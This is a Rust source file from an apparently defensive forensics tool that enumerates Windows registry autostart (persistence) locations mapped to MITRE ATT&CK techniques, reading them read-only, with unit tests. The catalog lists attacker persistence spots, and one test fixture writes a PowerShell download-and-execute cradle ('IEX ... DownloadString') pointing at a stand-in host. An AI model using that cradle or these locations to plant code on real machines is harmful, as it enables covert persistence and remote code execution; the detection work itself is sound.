//! Extended autostart (ASEP) catalog: registry persistence locations beyond the core
//! Run/services/tasks/Winlogon/IFEO readers in `persist.rs`, chosen from the
//! techniques attackers actually use (MITRE ATT&CK T1546 / T1547 / T1137 / T1037 /
//! T1556) and from the PersistenceSniper detection list.
//!
//! Every location is described once in [`CATALOG`] as data. Reading goes through the
//! [`RegRead`] seam, so the catalog-to-record logic is unit-tested with a fake
//! registry off-Windows; only [`WinReg`] touches the real registry (read-only opens).
//! Judging what is normal for each mechanism is NOT done here — that knowledge lives
//! in `cairn-heur` (analyzers never touch the host; collectors never judge).

use cairn_core::record::PersistenceRecord;
use chrono::{DateTime, Utc};

/// Registry root a catalog entry lives under.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Hive {
    Hklm,
    Hkcu,
}

impl Hive {
    fn prefix(self) -> &'static str {
        match self {
            Hive::Hklm => "HKLM",
            Hive::Hkcu => "HKCU",
        }
    }
}

/// One registry value's data, reduced to what persistence analysis needs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RegData {
    /// REG_SZ / REG_EXPAND_SZ.
    Str(String),
    /// REG_MULTI_SZ.
    Multi(Vec<String>),
    /// Anything else (DWORD, binary, ...). Not a command; skipped.
    Other,
}

/// A key's values (default value under the name `""`) plus its LastWrite.
pub type KeyValues = (Vec<(String, RegData)>, Option<DateTime<Utc>>);

/// Read-only registry access used by the catalog. `values` returns every value of a
/// key (default value under the name `""`) plus the key's LastWrite; `subkeys` lists
/// child key names. Both return empty/None when the key is absent or unreadable.
pub trait RegRead {
    fn values(&self, hive: Hive, key: &str) -> Option<KeyValues>;
    fn subkeys(&self, hive: Hive, key: &str) -> Vec<String>;
}

/// What to take from a catalog key.
#[derive(Debug, Clone, Copy)]
pub enum Select {
    /// Every value of the key; value name -> `value`, data -> `command`.
    AllValues,
    /// One named value. REG_MULTI_SZ yields one record per item; a list value
    /// (`split_list`) yields one record per comma/space-separated item.
    Value {
        name: &'static str,
        split_list: bool,
    },
    /// For each subkey, the named value (subkey name -> `value`).
    SubkeyValue(&'static str),
    /// For each subkey, the default value of its child key (e.g. CLSID\{x}\InprocServer32).
    SubkeyChildDefault(&'static str),
}

/// How a record's `command` maps to a file for signature checks.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Target {
    /// A command line: binary_path is derived by persist.rs's candidate model.
    Command,
    /// A DLL / package name: a bare name resolves to `%SystemRoot%\System32\<name>`
    /// (`.dll` appended when there is no extension), as the loader would.
    Dll,
}

/// One autostart location.
#[derive(Debug, Clone, Copy)]
pub struct AsepSpec {
    /// `PersistenceRecord.mechanism`; cairn-heur keys its judgement and MITRE ID on it.
    pub mechanism: &'static str,
    pub hive: Hive,
    pub key: &'static str,
    pub select: Select,
    pub target: Target,
}

const fn spec(
    mechanism: &'static str,
    hive: Hive,
    key: &'static str,
    select: Select,
    target: Target,
) -> AsepSpec {
    AsepSpec {
        mechanism,
        hive,
        key,
        select,
        target,
    }
}

const LSA: &str = r"SYSTEM\CurrentControlSet\Control\Lsa";
const WINLOGON: &str = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";

/// The extended ASEP catalog. Mechanism names are the contract with
/// `cairn_heur::persist` (see `asep_mitre` / `asep_signal` there).
pub const CATALOG: &[AsepSpec] = &[
    // T1547.001 — 32-bit Run keys and policy-driven Run keys (missed by run_key reader).
    spec(
        "run_key",
        Hive::Hklm,
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
        Select::AllValues,
        Target::Command,
    ),
    spec(
        "run_key",
        Hive::Hklm,
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
        Select::AllValues,
        Target::Command,
    ),
    spec(
        "explorer_policy_run",
        Hive::Hklm,
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
        Select::AllValues,
        Target::Command,
    ),
    spec(
        "explorer_policy_run",
        Hive::Hkcu,
        r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
        Select::AllValues,
        Target::Command,
    ),
    // T1547.001 — BootExecute (native programs run by smss before Windows starts).
    spec(
        "boot_execute",
        Hive::Hklm,
        r"SYSTEM\CurrentControlSet\Control\Session Manager",
        Select::Value {
            name: "BootExecute",
            split_list: false,
        },
        Target::Command,
    ),
    // T1547.002 / T1547.005 / T1556.002 — LSA packages and password filters.
    spec(
        "lsa_auth_package",
        Hive::Hklm,
        LSA,
        Select::Value {
            name: "Authentication Packages",
            split_list: false,
        },
        Target::Dll,
    ),
    spec(
        "lsa_security_package",
        Hive::Hklm,
        LSA,
        Select::Value {
            name: "Security Packages",
            split_list: false,
        },
        Target::Dll,
    ),
    spec(
        "lsa_security_package",
        Hive::Hklm,
        r"SYSTEM\CurrentControlSet\Control\Lsa\OSConfig",
        Select::Value {
            name: "Security Packages",
            split_list: false,
        },
        Target::Dll,
    ),
    spec(
        "lsa_notification_package",
        Hive::Hklm,
        LSA,
        Select::Value {
            name: "Notification Packages",
            split_list: false,
        },
        Target::Dll,
    ),
    // T1547.003 — time provider DLLs.
    spec(
        "time_provider",
        Hive::Hklm,
        r"SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders",
        Select::SubkeyValue("DllName"),
        Target::Dll,
    ),
    // T1547.004 — Winlogon Notify packages and MPNotify.
    spec(
        "winlogon_notify",
        Hive::Hklm,
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify",
        Select::SubkeyValue("DllName"),
        Target::Dll,
    ),
    spec(
        "winlogon_mpnotify",
        Hive::Hklm,
        WINLOGON,
        Select::Value {
            name: "mpnotify",
            split_list: false,
        },
        Target::Command,
    ),
    // T1547.010 — port monitors.
    spec(
        "print_monitor",
        Hive::Hklm,
        r"SYSTEM\CurrentControlSet\Control\Print\Monitors",
        Select::SubkeyValue("Driver"),
        Target::Dll,
    ),
    // T1547.014 — Active Setup.
    spec(
        "active_setup",
        Hive::Hklm,
        r"SOFTWARE\Microsoft\Active Setup\Installed Components",
        Select::SubkeyValue("StubPath"),
        Target::Command,
    ),
    // T1546.002 — screensaver.
    spec(
        "screensaver",
        Hive::Hkcu,
        r"Control Panel\Desktop",
        Select::Value {
            name: "SCRNSAVE.EXE",
            split_list: false,
        },
        Target::Command,
    ),
    // T1546.007 — netsh helper DLLs.
    spec(
        "netsh_helper",
        Hive::Hklm,
        r"SOFTWARE\Microsoft\NetSh",
        Select::AllValues,
        Target::Dll,
    ),
    // T1546.009 — AppCert DLLs.
    spec(
        "appcert_dlls",
        Hive::Hklm,
        r"SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls",
        Select::AllValues,
        Target::Dll,
    ),
    // T1546.010 — AppInit DLLs (both bitnesses).
    spec(
        "appinit_dlls",
        Hive::Hklm,
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
        Select::Value {
            name: "AppInit_DLLs",
            split_list: true,
        },
        Target::Dll,
    ),
    spec(
        "appinit_dlls",
        Hive::Hklm,
        r"SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Windows",
        Select::Value {
            name: "AppInit_DLLs",
            split_list: true,
        },
        Target::Dll,
    ),
    // T1546.012 — SilentProcessExit monitor (IFEO-adjacent).
    spec(
        "silent_exit_monitor",
        Hive::Hklm,
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit",
        Select::SubkeyValue("MonitorProcess"),
        Target::Command,
    ),
    // T1546.015 — per-user COM hijack (HKCU CLSID shadows HKLM).
    spec(
        "com_hijack",
        Hive::Hkcu,
        r"Software\Classes\CLSID",
        Select::SubkeyChildDefault("InprocServer32"),
        Target::Dll,
    ),
    // T1546 — cmd.exe AutoRun.
    spec(
        "cmd_autorun",
        Hive::Hklm,
        r"SOFTWARE\Microsoft\Command Processor",
        Select::Value {
            name: "AutoRun",
            split_list: false,
        },
        Target::Command,
    ),
    spec(
        "cmd_autorun",
        Hive::Hkcu,
        r"Software\Microsoft\Command Processor",
        Select::Value {
            name: "AutoRun",
            split_list: false,
        },
        Target::Command,
    ),
    // T1137.002 — Office Test key.
    spec(
        "office_test",
        Hive::Hkcu,
        r"Software\Microsoft\Office test\Special\Perf",
        Select::Value {
            name: "",
            split_list: false,
        },
        Target::Dll,
    ),
    spec(
        "office_test",
        Hive::Hklm,
        r"SOFTWARE\Microsoft\Office test\Special\Perf",
        Select::Value {
            name: "",
            split_list: false,
        },
        Target::Dll,
    ),
    // T1037.001 — logon script.
    spec(
        "logon_script",
        Hive::Hkcu,
        r"Environment",
        Select::Value {
            name: "UserInitMprLogonScript",
            split_list: false,
        },
        Target::Command,
    ),
];

/// Turn one catalog entry into raw records via `reg`. Pure given `reg`; never panics.
/// `binary_path` is filled only for [`Target::Dll`] (via `system_root`); command-line
/// targets are resolved later by persist.rs's candidate model.
pub fn read_spec(reg: &dyn RegRead, spec: &AsepSpec, system_root: &str) -> Vec<PersistenceRecord> {
    let base = format!("{}\\{}", spec.hive.prefix(), spec.key);
    let mut out = Vec::new();
    let mut push = |location: String, value: String, data: String, lw: Option<DateTime<Utc>>| {
        let data = data.trim().trim_end_matches('\0').trim().to_string();
        if data.is_empty() {
            return;
        }
        let binary_path = match spec.target {
            Target::Dll => Some(resolve_dll(&data, system_root)),
            Target::Command => None,
        };
        out.push(PersistenceRecord {
            mechanism: spec.mechanism.to_string(),
            location,
            value: Some(value),
            command: Some(data),
            binary_path,
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write: lw,
        });
    };
    match spec.select {
        Select::AllValues => {
            if let Some((values, lw)) = reg.values(spec.hive, spec.key) {
                for (name, data) in values {
                    for item in items(&data, false) {
                        push(base.clone(), name.clone(), item, lw);
                    }
                }
            }
        }
        Select::Value { name, split_list } => {
            if let Some((values, lw)) = reg.values(spec.hive, spec.key) {
                for (n, data) in values {
                    if !n.eq_ignore_ascii_case(name) {
                        continue;
                    }
                    for item in items(&data, split_list) {
                        let label = if name.is_empty() { "(Default)" } else { name };
                        push(base.clone(), label.to_string(), item, lw);
                    }
                }
            }
        }
        Select::SubkeyValue(value_name) => {
            for sub in reg.subkeys(spec.hive, spec.key) {
                let key = format!("{}\\{}", spec.key, sub);
                if let Some((values, lw)) = reg.values(spec.hive, &key) {
                    for (n, data) in values {
                        if n.eq_ignore_ascii_case(value_name) {
                            for item in items(&data, false) {
                                push(format!("{base}\\{sub}"), sub.clone(), item, lw);
                            }
                        }
                    }
                }
            }
        }
        Select::SubkeyChildDefault(child) => {
            for sub in reg.subkeys(spec.hive, spec.key) {
                let key = format!("{}\\{}\\{}", spec.key, sub, child);
                if let Some((values, lw)) = reg.values(spec.hive, &key) {
                    for (n, data) in values {
                        if n.is_empty() {
                            for item in items(&data, false) {
                                push(format!("{base}\\{sub}\\{child}"), sub.clone(), item, lw);
                            }
                        }
                    }
                }
            }
        }
    }
    out
}

/// Read the whole catalog. Every entry is best-effort: an absent key contributes
/// nothing.
pub fn read_catalog(reg: &dyn RegRead, system_root: &str) -> Vec<PersistenceRecord> {
    CATALOG
        .iter()
        .flat_map(|s| read_spec(reg, s, system_root))
        .collect()
}

/// Split a value's data into the items it lists.
fn items(data: &RegData, split_list: bool) -> Vec<String> {
    match data {
        RegData::Str(s) if split_list => s
            .split([',', ' '])
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_string)
            .collect(),
        RegData::Str(s) => vec![s.clone()],
        RegData::Multi(v) => v.iter().filter(|s| !s.trim().is_empty()).cloned().collect(),
        RegData::Other => Vec::new(),
    }
}

/// Resolve a DLL/package reference the way the loader would for these keys: absolute
/// paths stay (env vars expanded), bare names live in `%SystemRoot%\System32`, and a
/// missing extension means `.dll`. Quotes are stripped.
pub fn resolve_dll(name: &str, system_root: &str) -> String {
    let n = name.trim().trim_matches('"');
    let expanded = expand_system_root(n, system_root);
    let is_path = expanded.contains('\\') || expanded.contains('/');
    let with_dir = if is_path {
        expanded
    } else {
        format!(r"{system_root}\System32\{expanded}")
    };
    let file = with_dir.rsplit(['\\', '/']).next().unwrap_or("");
    if file.contains('.') {
        with_dir
    } else {
        format!("{with_dir}.dll")
    }
}

/// Expand `%SystemRoot%` / `%windir%` (any case) — the only variables these keys use.
fn expand_system_root(s: &str, system_root: &str) -> String {
    let lower = s.to_ascii_lowercase();
    for var in ["%systemroot%", "%windir%"] {
        if let Some(pos) = lower.find(var) {
            return format!("{}{}{}", &s[..pos], system_root, &s[pos + var.len()..]);
        }
    }
    s.to_string()
}

/// Max bytes of a PowerShell profile kept in `command` for content inspection.
const PROFILE_EXCERPT_BYTES: usize = 8 * 1024;

/// The PowerShell profile scripts that run at every PowerShell start (T1546.013):
/// all-users profiles for Windows PowerShell and PowerShell 7, and the current user's
/// profiles under Documents. Missing env vars just drop their entries.
pub fn ps_profile_paths(env: impl Fn(&str) -> Option<String>) -> Vec<String> {
    let mut out = Vec::new();
    if let Some(root) = env("SystemRoot").or_else(|| env("windir")) {
        for f in ["profile.ps1", "Microsoft.PowerShell_profile.ps1"] {
            out.push(format!(r"{root}\System32\WindowsPowerShell\v1.0\{f}"));
        }
    }
    if let Some(pf) = env("ProgramFiles") {
        for f in ["profile.ps1", "Microsoft.PowerShell_profile.ps1"] {
            out.push(format!(r"{pf}\PowerShell\7\{f}"));
        }
    }
    if let Some(home) = env("USERPROFILE") {
        for dir in ["WindowsPowerShell", "PowerShell"] {
            for f in ["profile.ps1", "Microsoft.PowerShell_profile.ps1"] {
                out.push(format!(r"{home}\Documents\{dir}\{f}"));
            }
        }
    }
    out
}

/// One `ps_profile` record per existing profile file. `command` holds the first
/// [`PROFILE_EXCERPT_BYTES`] of its text so cairn-heur can look for download/encoded
/// payloads; `binary_path` is the script itself. Read-only; unreadable files skipped.
pub fn read_ps_profiles(paths: &[String]) -> Vec<PersistenceRecord> {
    let mut out = Vec::new();
    for path in paths {
        let Ok(bytes) = std::fs::read(path) else {
            continue;
        };
        let excerpt = &bytes[..bytes.len().min(PROFILE_EXCERPT_BYTES)];
        let text = String::from_utf8_lossy(excerpt)
            .trim_start_matches('\u{feff}')
            .to_string();
        let last_write = std::fs::metadata(path)
            .ok()
            .and_then(|m| m.modified().ok())
            .map(DateTime::<Utc>::from);
        let file = path.rsplit(['\\', '/']).next().unwrap_or(path).to_string();
        out.push(PersistenceRecord {
            mechanism: "ps_profile".to_string(),
            location: path.clone(),
            value: Some(file),
            command: Some(text),
            binary_path: Some(path.clone()),
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write,
        });
    }
    out
}

/// The real, read-only Windows registry.
#[cfg(windows)]
pub struct WinReg;

#[cfg(windows)]
impl RegRead for WinReg {
    fn values(&self, hive: Hive, key: &str) -> Option<KeyValues> {
        use chrono::TimeZone;
        use winreg::enums::{RegType, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
        let root = winreg::RegKey::predef(match hive {
            Hive::Hklm => HKEY_LOCAL_MACHINE,
            Hive::Hkcu => HKEY_CURRENT_USER,
        });
        let k = root.open_subkey(key).ok()?;
        let lw = k.query_info().ok().and_then(|info| {
            let st = info.get_last_write_time_system();
            Utc.with_ymd_and_hms(
                st.wYear as i32,
                st.wMonth as u32,
                st.wDay as u32,
                st.wHour as u32,
                st.wMinute as u32,
                st.wSecond as u32,
            )
            .single()
        });
        let mut out = Vec::new();
        for item in k.enum_values().flatten() {
            let (name, raw) = item;
            let data = match raw.vtype {
                RegType::REG_SZ | RegType::REG_EXPAND_SZ => k
                    .get_value::<String, _>(&name)
                    .map(RegData::Str)
                    .unwrap_or(RegData::Other),
                RegType::REG_MULTI_SZ => k
                    .get_value::<Vec<String>, _>(&name)
                    .map(RegData::Multi)
                    .unwrap_or(RegData::Other),
                _ => RegData::Other,
            };
            out.push((name, data));
        }
        Some((out, lw))
    }

    fn subkeys(&self, hive: Hive, key: &str) -> Vec<String> {
        use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
        let root = winreg::RegKey::predef(match hive {
            Hive::Hklm => HKEY_LOCAL_MACHINE,
            Hive::Hkcu => HKEY_CURRENT_USER,
        });
        root.open_subkey(key)
            .map(|k| k.enum_keys().flatten().collect())
            .unwrap_or_default()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    /// In-memory registry: (hive, lowercased key) -> values; subkeys derived from keys.
    #[derive(Default)]
    struct FakeReg {
        keys: HashMap<(u8, String), Vec<(String, RegData)>>,
    }

    fn hive_id(h: Hive) -> u8 {
        match h {
            Hive::Hklm => 0,
            Hive::Hkcu => 1,
        }
    }

    impl FakeReg {
        fn set(&mut self, hive: Hive, key: &str, name: &str, data: RegData) -> &mut Self {
            self.keys
                .entry((hive_id(hive), key.to_ascii_lowercase()))
                .or_default()
                .push((name.to_string(), data));
            self
        }
    }

    impl RegRead for FakeReg {
        fn values(&self, hive: Hive, key: &str) -> Option<KeyValues> {
            self.keys
                .get(&(hive_id(hive), key.to_ascii_lowercase()))
                .map(|v| (v.clone(), None))
        }
        fn subkeys(&self, hive: Hive, key: &str) -> Vec<String> {
            let prefix = format!("{}\\", key.to_ascii_lowercase());
            let mut subs: Vec<String> = self
                .keys
                .keys()
                .filter(|(h, k)| *h == hive_id(hive) && k.starts_with(&prefix))
                .filter_map(|(_, k)| k[prefix.len()..].split('\\').next().map(str::to_string))
                .collect();
            subs.sort();
            subs.dedup();
            subs
        }
    }

    fn s(v: &str) -> RegData {
        RegData::Str(v.to_string())
    }

    #[test]
    fn empty_registry_yields_nothing() {
        assert!(read_catalog(&FakeReg::default(), r"C:\Windows").is_empty());
    }

    /// LSA Security Packages is REG_MULTI_SZ: one record per package, bare names
    /// resolved into System32 with `.dll`.
    #[test]
    fn lsa_multi_sz_yields_one_record_per_package() {
        let mut reg = FakeReg::default();
        reg.set(
            Hive::Hklm,
            LSA,
            "Security Packages",
            RegData::Multi(vec!["kerberos".into(), "mimilib".into(), "".into()]),
        );
        let recs = read_catalog(&reg, r"C:\Windows");
        let pkgs: Vec<_> = recs
            .iter()
            .filter(|r| r.mechanism == "lsa_security_package")
            .map(|r| (r.command.clone().unwrap(), r.binary_path.clone().unwrap()))
            .collect();
        assert_eq!(
            pkgs,
            vec![
                (
                    "kerberos".into(),
                    r"C:\Windows\System32\kerberos.dll".into()
                ),
                ("mimilib".into(), r"C:\Windows\System32\mimilib.dll".into()),
            ]
        );
    }

    /// AppInit_DLLs is a comma/space separated list in one REG_SZ.
    #[test]
    fn appinit_list_is_split() {
        let mut reg = FakeReg::default();
        reg.set(
            Hive::Hklm,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
            "AppInit_DLLs",
            s(r"C:\ProgramData\a.dll, C:\Users\Public\b.dll"),
        );
        let recs: Vec<_> = read_catalog(&reg, r"C:\Windows")
            .into_iter()
            .filter(|r| r.mechanism == "appinit_dlls")
            .collect();
        assert_eq!(recs.len(), 2);
        assert_eq!(
            recs[1].binary_path.as_deref(),
            Some(r"C:\Users\Public\b.dll")
        );
    }

    /// An empty AppInit_DLLs (the default) yields nothing.
    #[test]
    fn empty_value_yields_nothing() {
        let mut reg = FakeReg::default();
        reg.set(
            Hive::Hklm,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
            "AppInit_DLLs",
            s(""),
        );
        assert!(read_catalog(&reg, r"C:\Windows").is_empty());
    }

    /// SubkeyValue walks children: each print monitor's Driver becomes a record.
    #[test]
    fn subkey_value_reads_each_child() {
        let mut reg = FakeReg::default();
        let base = r"SYSTEM\CurrentControlSet\Control\Print\Monitors";
        reg.set(
            Hive::Hklm,
            &format!(r"{base}\Local Port"),
            "Driver",
            s("localspl.dll"),
        )
        .set(
            Hive::Hklm,
            &format!(r"{base}\Evil"),
            "Driver",
            s(r"C:\Temp\evil.dll"),
        );
        let recs: Vec<_> = read_catalog(&reg, r"C:\Windows")
            .into_iter()
            .filter(|r| r.mechanism == "print_monitor")
            .collect();
        assert_eq!(recs.len(), 2);
        let evil = recs
            .iter()
            .find(|r| r.value.as_deref() == Some("evil"))
            .unwrap();
        assert_eq!(evil.binary_path.as_deref(), Some(r"C:\Temp\evil.dll"));
    }

    /// HKCU COM hijack: CLSID\{guid}\InprocServer32 default value.
    #[test]
    fn com_hijack_reads_inproc_default() {
        let mut reg = FakeReg::default();
        reg.set(
            Hive::Hkcu,
            r"Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32",
            "",
            s(r"C:\Users\v\AppData\Roaming\x.dll"),
        );
        let recs: Vec<_> = read_catalog(&reg, r"C:\Windows")
            .into_iter()
            .filter(|r| r.mechanism == "com_hijack")
            .collect();
        assert_eq!(recs.len(), 1);
        assert_eq!(
            recs[0].binary_path.as_deref(),
            Some(r"C:\Users\v\AppData\Roaming\x.dll")
        );
    }

    /// Office Test uses the key's default value; the record labels it "(Default)".
    #[test]
    fn office_test_default_value_is_labelled() {
        let mut reg = FakeReg::default();
        reg.set(
            Hive::Hkcu,
            r"Software\Microsoft\Office test\Special\Perf",
            "",
            s(r"C:\Users\v\AppData\Roaming\perf.dll"),
        );
        let recs = read_catalog(&reg, r"C:\Windows");
        assert_eq!(recs.len(), 1);
        assert_eq!(recs[0].mechanism, "office_test");
        assert_eq!(recs[0].value.as_deref(), Some("(Default)"));
        assert_eq!(
            recs[0].location,
            r"HKCU\Software\Microsoft\Office test\Special\Perf"
        );
    }

    /// Non-string data (DWORD etc.) is never a command.
    #[test]
    fn non_string_data_is_skipped() {
        let mut reg = FakeReg::default();
        reg.set(Hive::Hklm, r"SOFTWARE\Microsoft\NetSh", "x", RegData::Other);
        assert!(read_catalog(&reg, r"C:\Windows").is_empty());
    }

    #[test]
    fn resolve_dll_handles_bare_env_and_absolute_names() {
        let root = r"C:\Windows";
        assert_eq!(
            resolve_dll("msv1_0", root),
            r"C:\Windows\System32\msv1_0.dll"
        );
        assert_eq!(
            resolve_dll("ifmon.dll", root),
            r"C:\Windows\System32\ifmon.dll"
        );
        assert_eq!(
            resolve_dll(r"%SystemRoot%\System32\w32time.dll", root),
            r"C:\Windows\System32\w32time.dll"
        );
        assert_eq!(resolve_dll(r#""C:\Temp\x.dll""#, root), r"C:\Temp\x.dll");
    }

    #[test]
    fn ps_profile_paths_cover_all_users_and_current_user() {
        let env = |k: &str| match k {
            "SystemRoot" => Some(r"C:\Windows".to_string()),
            "ProgramFiles" => Some(r"C:\Program Files".to_string()),
            "USERPROFILE" => Some(r"C:\Users\v".to_string()),
            _ => None,
        };
        let paths = ps_profile_paths(env);
        assert!(
            paths.contains(&r"C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1".to_string())
        );
        assert!(paths.contains(
            &r"C:\Users\v\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1".to_string()
        ));
        assert!(paths.contains(&r"C:\Program Files\PowerShell\7\profile.ps1".to_string()));
        assert_eq!(paths.len(), 8);
    }

    /// An existing profile becomes a ps_profile record carrying its text; a missing
    /// path is skipped.
    #[test]
    fn read_ps_profiles_reads_existing_files_only() {
        let dir = std::env::temp_dir().join("cairn_asep_profile_test");
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let p = dir.join("profile.ps1");
        std::fs::write(
            &p,
            "\u{feff}IEX (New-Object Net.WebClient).DownloadString('http://x')",
        )
        .unwrap();
        let recs = read_ps_profiles(&[
            p.to_string_lossy().to_string(),
            dir.join("missing.ps1").to_string_lossy().to_string(),
        ]);
        let _ = std::fs::remove_dir_all(&dir);
        assert_eq!(recs.len(), 1);
        assert_eq!(recs[0].mechanism, "ps_profile");
        assert!(recs[0].command.as_deref().unwrap().starts_with("IEX"));
    }

    /// Mechanism names in the catalog are the contract with cairn-heur; keep them
    /// stable and lowercase snake_case.
    #[test]
    fn catalog_mechanisms_are_snake_case() {
        for s in CATALOG {
            assert!(
                s.mechanism
                    .chars()
                    .all(|c| c.is_ascii_lowercase() || c == '_'),
                "{}",
                s.mechanism
            );
        }
    }
}
